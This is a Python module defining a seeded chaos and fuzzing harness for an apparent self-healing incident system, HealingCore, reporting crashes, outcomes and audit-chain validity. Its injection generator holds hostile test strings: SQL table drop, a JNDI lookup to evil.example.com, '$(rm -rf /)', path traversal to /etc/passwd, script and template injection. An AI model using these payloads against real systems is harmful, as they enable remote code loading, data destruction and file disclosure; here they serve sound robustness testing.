"""
healing_core.chaos — ChaosHarness  (v0.11)

Per the HealingCore guideline:

  "Provide unit tests for every remediation primitive, integration
   tests that simulate partial failures, fuzzing and adversarial
   sequence testing of remediation flows, and regular chaos/red-team
   drills."

ChaosHarness generates deterministic (seeded) adversarial event
sequences and feeds them through HealingCore.ingest(), then reports:

  - any unhandled exception raised by the core (these are bugs)
  - incident outcome distribution (healed / escalated / suppressed /
    budget_blocked / canary_blocked / auth_rejected)
  - whether the audit hash-chain remains valid after the run
  - wall-clock duration (helps catch pathological regex/perf issues)

Adversarial generators included:
  - storm:      rapid duplicate events from one actor (correlator/cooldown)
  - giant:      10,000-character messages (regex perf / DoS)
  - unicode:    emoji, RTL text, zero-width characters
  - injection:  SQL/format-string/template-injection-looking strings
  - cross_os:   Windows EventIDs mixed with Unix paths in one message
  - empty:      empty/whitespace-only fields
  - catalog_mix:random real entries from both exception catalogs, shuffled

Determinism: the entire sequence is derived from a single integer
`seed` via `random.Random(seed)`, so `run(core, seed=42)` always
generates the exact same sequence — required for "deterministic
simulator/ratchet-test harness" replay per the guideline.

Usage:
    harness = ChaosHarness(seed=42)
    report  = harness.run(core, n_events=200)
    print(report.summary())
"""
from __future__ import annotations

import logging
import random
import time
import uuid
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, TYPE_CHECKING

if TYPE_CHECKING:
    from .core import HealingCore

from .models import Event

log = logging.getLogger("healing_core.chaos")


@dataclass
class ChaosReport:
    seed:             int
    total_events:     int  = 0
    exceptions:       int  = 0
    crash_details:    List[str] = field(default_factory=list)
    outcomes:         Dict[str, int] = field(default_factory=dict)
    audit_chain_valid_before: bool = True
    audit_chain_valid_after:  bool = True
    duration_s:       float = 0.0
    generators_used:  Dict[str, int] = field(default_factory=dict)

    @property
    def success(self) -> bool:
        return (self.exceptions == 0 and self.audit_chain_valid_after)

    def summary(self) -> str:
        lines = [
            f"ChaosReport(seed={self.seed})",
            f"  events:        {self.total_events}",
            f"  exceptions:    {self.exceptions}",
            f"  duration:      {self.duration_s:.2f}s",
            f"  chain valid:   before={self.audit_chain_valid_before} "
            f"after={self.audit_chain_valid_after}",
            f"  outcomes:      {self.outcomes}",
            f"  generators:    {self.generators_used}",
        ]
        if self.crash_details:
            lines.append("  crashes:")
            for c in self.crash_details[:10]:
                lines.append(f"    - {c}")
        return "\n".join(lines)


class ChaosHarness:
    """Deterministic adversarial-sequence generator and runner."""

    def __init__(self, seed: int = 42) -> None:
        self.seed = seed
        self._rng = random.Random(seed)

        # Pull real catalog entries for "catalog_mix" generator
        try:
            from .exception_catalog import ExceptionCatalog
            from .os_fault_catalog   import OsFaultCatalog
            self._exc_entries = ExceptionCatalog().all_entries()
            self._fault_entries = OsFaultCatalog().all_entries()
        except Exception:
            self._exc_entries = []
            self._fault_entries = []

        self._generators: Dict[str, Callable[[], Event]] = {
            "storm":       self._gen_storm_seed,
            "giant":       self._gen_giant,
            "unicode":     self._gen_unicode,
            "injection":   self._gen_injection,
            "cross_os":    self._gen_cross_os,
            "empty":       self._gen_empty,
            "catalog_mix": self._gen_catalog_mix,
            "normal":      self._gen_normal,
        }

    # ── Public API ─────────────────────────────────────────────────────────

    def generate_sequence(self, n_events: int) -> List[Event]:
        """Deterministically generate n_events adversarial Events.

        Re-seeds the internal RNG so repeated calls with the same
        harness instance produce the same sequence (replay safety).
        """
        self._rng = random.Random(self.seed)
        names = list(self._generators.keys())
        sequence: List[Event] = []

        i = 0
        while i < n_events:
            gen_name = self._rng.choice(names)
            gen_fn   = self._generators[gen_name]

            if gen_name == "storm":
                # Bursts of 5-15 identical-actor events
                burst = self._rng.randint(5, 15)
                actor = f"storm_actor_{self._rng.randint(1,5)}"
                for _ in range(min(burst, n_events - i)):
                    sequence.append(self._gen_storm(actor))
                    i += 1
                continue

            evt = gen_fn()
            evt.id = str(uuid.uuid4())
            sequence.append(evt)
            i += 1

        return sequence

    def run(self, core: "HealingCore", n_events: int = 100,
            fast_canary: bool = True) -> ChaosReport:
        """Feed a generated sequence through core.ingest() and report.

        fast_canary: if True (default), temporarily sets
        core.canary._cfg.wait_seconds = 0 for the duration of the run
        and restores it afterward. Chaos runs are about exercising
        classification/containment/audit-chain robustness across many
        events quickly — the canary metric-window wait (default 30s
        per high-impact fix attempt) is tested separately in
        test_v08.py and would make a 100-200 event chaos run
        impractically slow (minutes to hours) without this.
        """
        report = ChaosReport(seed=self.seed)
        sequence = self.generate_sequence(n_events)
        report.total_events = len(sequence)

        # Snapshot chain validity BEFORE the run
        try:
            ok_before, _ = core.audit.verify_chain()
            report.audit_chain_valid_before = ok_before
        except Exception as exc:
            log.debug("chaos | pre-run chain check failed: %s", exc)

        orig_wait = None
        if fast_canary and getattr(core, "canary", None) is not None:
            try:
                orig_wait = core.canary._cfg.wait_seconds
                core.canary._cfg.wait_seconds = 0
            except AttributeError:
                orig_wait = None

        start = time.monotonic()
        try:
            for evt in sequence:
                gen_tag = getattr(evt, "_chaos_gen", "unknown")
                report.generators_used[gen_tag] = report.generators_used.get(gen_tag, 0) + 1
                try:
                    inc = core.ingest(evt)
                    status = inc.status.name if inc else "filtered"
                except Exception as exc:
                    report.exceptions += 1
                    detail = (f"gen={gen_tag}  error_type={evt.error_type!r}  "
                             f"actor={evt.actor!r}  exc={type(exc).__name__}: {exc}")
                    report.crash_details.append(detail)
                    log.warning("chaos | exception during ingest: %s", detail)
                    status = "EXCEPTION"
                report.outcomes[status] = report.outcomes.get(status, 0) + 1
        finally:
            if orig_wait is not None:
                core.canary._cfg.wait_seconds = orig_wait

        report.duration_s = time.monotonic() - start

        # Snapshot chain validity AFTER the run
        try:
            ok_after, bad_ids = core.audit.verify_chain()
            report.audit_chain_valid_after = ok_after
            if not ok_after:
                report.crash_details.append(
                    f"audit chain broken after run: {len(bad_ids)} bad entries")
        except Exception as exc:
            report.audit_chain_valid_after = False
            report.crash_details.append(f"chain verification raised: {exc}")

        return report

    # ── Generators (each returns one Event) ─────────────────────────────────

    def _tag(self, evt: Event, name: str) -> Event:
        evt._chaos_gen = name   # type: ignore[attr-defined]
        return evt

    def _gen_normal(self) -> Event:
        scenarios = [
            ("oom_kill",    "Out of memory: kill process nginx",       "nginx",   "kernel"),
            ("disk_full",   "No space left on device /var/log",        "journald","storage"),
            ("dns_timeout", "DNS resolution timeout for api.example.com","resolver","network"),
            ("auth_failure","Authentication failed for user root",      "sshd",    "auth"),
            ("service_crash","Service mysql exited with code 1",        "mysql",   "service"),
        ]
        et, msg, actor, sub = self._rng.choice(scenarios)
        return self._tag(Event(error_type=et, message=msg, actor=actor, subsystem=sub), "normal")

    def _gen_storm_seed(self) -> Event:
        # Fallback single event if storm branch isn't taken directly
        return self._gen_storm(f"storm_actor_{self._rng.randint(1,5)}")

    def _gen_storm(self, actor: str) -> Event:
        return self._tag(Event(
            error_type="service_crash",
            message=f"{actor} crashed and restarted (storm test)",
            actor=actor, subsystem="service"), "storm")

    def _gen_giant(self) -> Event:
        # 10,000-char message — regex/perf stress
        filler = "x" * self._rng.randint(8000, 12000)
        msg = f"EventID 7034 service terminated: {filler}"
        return self._tag(Event(
            error_type="service_crash", message=msg,
            actor="giant_actor", subsystem="service"), "giant")

    def _gen_unicode(self) -> Event:
        samples = [
            "服务崩溃 EventID 7034 サービス再起動",
            "🔥💥 service crashed 🚨 disk_full /var/log 💾",
            "tëst \u200b\u200bzero-width\u200b chars نص عربي",
            "Ω≈ç√∫˜µ≤≥÷ EventID 4625 ログイン失敗",
        ]
        msg = self._rng.choice(samples)
        return self._tag(Event(
            error_type="unicode_test", message=msg,
            actor="unicode_actor", subsystem="test"), "unicode")

    def _gen_injection(self) -> Event:
        samples = [
            "'; DROP TABLE incidents; -- service crash",
            "service crash {0.__class__.__mro__[1].__subclasses__()}",
            "${jndi:ldap://evil.example.com/a} service error",
            "service crash %s%s%s%n format string test",
            "<script>alert(1)</script> service down",
            "../../../../etc/passwd service config error",
            "$(rm -rf /) service crashed",
            "{{7*7}} template injection service fail",
        ]
        msg = self._rng.choice(samples)
        return self._tag(Event(
            error_type="injection_test", message=msg,
            actor="inj_actor", subsystem="test"), "injection")

    def _gen_cross_os(self) -> Event:
        samples = [
            "EventID 7034 /etc/nginx/nginx.conf service terminated WinError 5",
            "systemctl restart sc.exe failed 0x80070005 /var/log/syslog",
            "launchctl kickstart EventID 4625 /proc/self/status WSAENETUNREACH",
            "C:\\Windows\\System32\\drivers\\etc\\hosts journalctl -f BSOD 0x0000007E",
        ]
        msg = self._rng.choice(samples)
        return self._tag(Event(
            error_type="cross_platform_test", message=msg,
            actor="cross_os_actor", subsystem="system"), "cross_os")

    def _gen_empty(self) -> Event:
        variants = [
            ("", "", ""),
            ("   ", "   ", "   "),
            ("\t\n", "\t\n\r", "actor"),
            ("unknown", "", "subsystem_only"),
        ]
        et, msg, sub = self._rng.choice(variants)
        actor = self._rng.choice(["", "actor_empty_test"])
        return self._tag(Event(
            error_type=et, message=msg, actor=actor, subsystem=sub), "empty")

    def _gen_catalog_mix(self) -> Event:
        """Pull a real pattern from the exception or fault catalogs and
        wrap it in an Event — verifies our own catalog entries don't
        crash the classifier/handler pipeline."""
        pool = []
        if self._exc_entries:
            pool.extend([("exc", e) for e in self._exc_entries])
        if self._fault_entries:
            pool.extend([("fault", e) for e in self._fault_entries])

        if not pool:
            return self._gen_normal()

        kind, entry = self._rng.choice(pool)
        if kind == "exc":
            # ExceptionEntry: build message from a pattern (strip regex specials)
            pat = self._rng.choice(entry.patterns) if entry.patterns else entry.exception_class
            msg = self._regex_to_text(pat)
            return self._tag(Event(
                error_type=entry.exception_class.lower().replace(".", "_")[:40],
                message=msg, actor="catalog_actor",
                subsystem=entry.category.name.lower()), "catalog_mix")
        else:
            pat = self._rng.choice(entry.patterns) if entry.patterns else entry.title
            msg = self._regex_to_text(pat)
            return self._tag(Event(
                error_type=entry.fault_id[:40], message=msg,
                actor="catalog_actor",
                subsystem=entry.category.name.lower()), "catalog_mix")

    @staticmethod
    def _regex_to_text(pattern: str) -> str:
        """Best-effort strip regex metacharacters to produce plausible text."""
        import re
        text = re.sub(r"[\\^$.|?*+()\[\]{}]", " ", pattern)
        text = re.sub(r"\s+", " ", text).strip()
        return text[:200] or "generic fault"
